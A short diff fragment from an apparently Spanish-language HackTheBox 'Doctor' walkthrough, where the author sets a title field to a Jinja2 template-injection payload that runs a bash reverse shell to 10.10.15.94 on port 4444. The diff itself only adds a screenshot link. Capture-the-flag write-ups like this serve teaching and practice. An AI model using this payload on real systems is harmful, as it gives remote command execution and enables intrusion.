@@ -67,3 +67,5 @@ Cambio el título y pongo lo siguiente para la reverse shell:
 ```python
 \{\{request.application.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/10.10.15.94/4444 0>&1'").read()\}\}
 ```
+![](/assets/images/Doctor-Hackthebox/doctor-reverse.png)
+
